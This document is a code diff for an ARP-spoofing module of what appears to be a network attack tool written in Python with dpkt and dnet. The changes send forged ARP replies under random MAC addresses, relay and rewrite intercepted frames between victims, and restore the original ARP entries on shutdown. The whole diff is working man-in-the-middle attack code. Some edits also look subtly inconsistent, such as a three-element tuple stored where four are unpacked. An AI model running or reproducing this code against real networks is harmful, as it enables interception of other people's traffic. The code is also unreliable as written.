@@ -48,12 +48,13 @@ class spoof_thread(threading.Thread):
         self.delay = delay
         self.running = True
         threading.Thread.__init__(self)
+        self.reset = False
 
     def run(self):
         while self.running:
             if self.parent.dnet:
                 for iter in self.parent.spoofs:
-                    (run, entry, org_data) = self.parent.spoofs[iter]
+                    (run, entry, org_data, hosts) = self.parent.spoofs[iter]
                     if run:
                         for data in entry:
                             self.parent.dnet.send(data)
@@ -61,7 +62,19 @@ class spoof_thread(threading.Thread):
             for x in xrange(self.delay):
                 if not self.running:
                     return
+                if self.reset:
+                    self.reset = False
+                    break
                 time.sleep(1)
+        for i in self.parent.spoofs:
+            (run, data, org_data, hosts) = self.parent.spoofs[i]
+            if run:
+                for j in org_data:
+                    self.parent.dnet.eth.send(j)
+        self.parent.log("ARP: Spoof thread terminated")
+
+    def wakeup(self):
+        self.reset = True
 
     def quit(self):
         self.running = False
@@ -80,6 +93,7 @@ class mod_class(object):
         self.dnet = None
         self.spoof_thread = None
         self.macs = None
+        self.reply = True
     
     def start_mod(self):
         self.spoof_thread = spoof_thread(self, 30)
@@ -225,17 +239,44 @@ class mod_class(object):
     def input_eth(self, eth, timestamp):
         arp = dpkt.arp.ARP(str(eth.data))
         mac = dnet.eth_ntoa(str(eth.src))
+        if not eth.src == self.mac:
+            if arp.op == dpkt.arp.ARP_OP_REQUEST:
+                ip_dst = dnet.eth_ntoa(str(arp.tha))
+                for h in self.hosts:
+                    if mac == h:
+                        (ip_src, rand_mac_src, iter_src, reply_src) = self.hosts[mac]
+                        for i in self.hosts:
+                            (ip, rand_mac_dst, iter_dst, reply_dst) = self.hosts[i]
+                            if ip_dst == ip:
+                                break
+                        if reply_src:
+                            _arp = dpkt.arp.ARP(    hrd=dpkt.arp.ARP_HRD_ETH,
+                                                    pro=dpkt.arp.ARP_PRO_IP,
+                                                    op=dpkt.arp.ARP_OP_REPLY,
+                                                    sha=dnet.eth_aton(rand_mac_dst),
+                                                    spa=arp.tpa,
+                                                    tha=arp.sha,
+                                                    tpa=arp.spa
+                                                    )
+                            _eth = dpkt.ethernet.Ethernet(  dst=arp.sha,
+                                                            src=dnet.eth_aton(rand_mac_dst),
+                                                            type=dpkt.ethernet.ETH_TYPE_ARP,
+                                                            data=str(_arp)
+                                                            )
+                            print "sending reply"
+                            self.dnet.send(str(_eth))
+                            break
         for h in self.hosts:
             if mac == h:
                 return
-            (ip, random_mac, iter) = self.hosts[h]
+            (ip, random_mac, iter, reply) = self.hosts[h]
             if mac == random_mac:
                 return
         ip = dnet.ip_ntoa(str(arp.spa))
         rand_mac = [ 0x00, random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff) ]
         rand_mac = ':'.join(map(lambda x: "%02x" % x, rand_mac))
         iter = self.hosts_liststore.append([mac, ip, self.mac_to_vendor(mac)])
-        self.hosts[mac] = (ip, rand_mac, iter)
+        self.hosts[mac] = (ip, rand_mac, iter, False)
 
     def get_ip_checks(self):
         return (self.check_ip, self.input_ip)
@@ -248,31 +289,35 @@ class mod_class(object):
         dst = dnet.eth_ntoa(str(eth.dst))
         good = False
         for h in self.hosts:
-            (ip, rand_mac, iter) = self.hosts[h]
+            (ip, rand_mac, iter, reply) = self.hosts[h]
             if src == h:
                 eth.src = dnet.eth_aton(rand_mac)
-                ref_src = h
+                ref_src = ip
                 if good:
                     self.dnet.send(str(eth))
-                    self.inc_packet_counter(ref_src, ref_dst)
+                    self.spoof_treestore.foreach(self.inc_packet_counter, (ref_src, ref_dst))
                     return
                 else:
                     good = True
             if dst == rand_mac:
                 eth.dst = dnet.eth_aton(h)
-                ref_dst = h
+                ref_dst = ip
                 if good:
                     self.dnet.send(str(eth))
-                    self.inc_packet_counter(ref_src, ref_dst)
+                    self.spoof_treestore.foreach(self.inc_packet_counter, (ref_src, ref_dst))
                     return
                 else:
                     good = True
 
-    def inc_packet_counter(self, ref_src, ref_dst):
-        for i in self.spoof_treestore:
-            (pic, src, dst, count) = self.spoof_treestore[i]
-            if src == ref_src and dst == ref_dst:
-                self.spoof_treestore[i] = (pic, src, dst, str(int(count) + 1))
+    def inc_packet_counter(self, model, path, iter, user_data):
+        if model.iter_has_child(iter):
+            return False
+        (ref_src, ref_dst) = user_data
+        (src, dst, count) = model.get(iter, 1, 2, 3)
+        if src == ref_src and dst == ref_dst:
+            self.spoof_treestore.set(iter, 3, str(int(count) + 1))
+            return True
+        return False
 
     def parse_macs(self, file):
         macs = {}
@@ -297,7 +342,7 @@ class mod_class(object):
             host = model.get_value(model.get_iter(i), 0)
             if host not in self.upper_add:
                 if host not in self.lower_add:
-                    (ip, rand_mac, iter) = self.hosts[host]
+                    (ip, rand_mac, iter, reply) = self.hosts[host]
                     iter = self.upper_add_liststore.append([host, ip])
                     self.upper_add[host] = (ip, rand_mac, iter)
 
@@ -308,7 +353,7 @@ class mod_class(object):
             host = model.get_value(model.get_iter(i), 0)
             if host not in self.upper_add:
                 if host not in self.lower_add:
-                    (ip, rand_mac, iter) = self.hosts[host]
+                    (ip, rand_mac, iter, reply) = self.hosts[host]
                     iter = self.lower_add_liststore.append([host, ip])
                     self.lower_add[host] = (ip, rand_mac, iter)
 
@@ -321,6 +366,7 @@ class mod_class(object):
         cur = self.spoof_treestore.get_string_from_iter(parent)
         data = []
         org_data = []
+        hosts = []
         for host_upper in self.upper_add:
             (ip_upper, rand_mac_upper, iter_upper) = self.upper_add[host_upper]
             for host_lower in self.lower_add:
@@ -379,7 +425,10 @@ class mod_class(object):
                                                 data=str(arp)
                                                 )
                 org_data.append(str(eth))
-        self.spoofs[cur] = (False, data, org_data)
+            hosts.append(host_upper)
+        for host_lower in self.lower_add:
+            hosts.append(host_lower)
+        self.spoofs[cur] = (False, data, org_data, hosts)
         self.upper_add = {}
         self.lower_add = {}
         self.upper_add_liststore.clear()
@@ -405,11 +454,14 @@ class mod_class(object):
                 parent = model.get_iter(i)
             self.spoof_treestore.set_value(parent, 0, self.offline)
             cur = self.spoof_treestore.get_string_from_iter(parent)
-            (run, data, org_data) = self.spoofs[cur]
+            (run, data, org_data, hosts) = self.spoofs[cur]
             if run:
                 self.spoofs[cur] = (False, data, org_data)
                 for j in org_data:
                     self.dnet.eth.send(j)
+            for i in hosts:
+                (ip, rand_mac, iter, reply) = self.hosts[i]
+                self.hosts[i] = (ip, rand_mac, iter, True)
 
     def on_start_spoof_button_clicked(self, data):
         select = self.spoof_treeview.get_selection()
@@ -420,8 +472,12 @@ class mod_class(object):
                 parent = model.get_iter(i)
             self.spoof_treestore.set_value(parent, 0, self.online)
             cur = self.spoof_treestore.get_string_from_iter(parent)
-            (run, data, org_data) = self.spoofs[cur]
-            self.spoofs[cur] = (True, data, org_data)
+            (run, data, org_data, hosts) = self.spoofs[cur]
+            self.spoofs[cur] = (True, data, org_data, hosts)
+            for i in hosts:
+                (ip, rand_mac, iter, reply) = self.hosts[i]
+                self.hosts[i] = (ip, rand_mac, iter, True)
+        self.spoof_thread.wakeup()
 
     def on_scan_start_button_clicked(self, data):
         ips = IPy.IP(self.scan_network_entry.get_text())
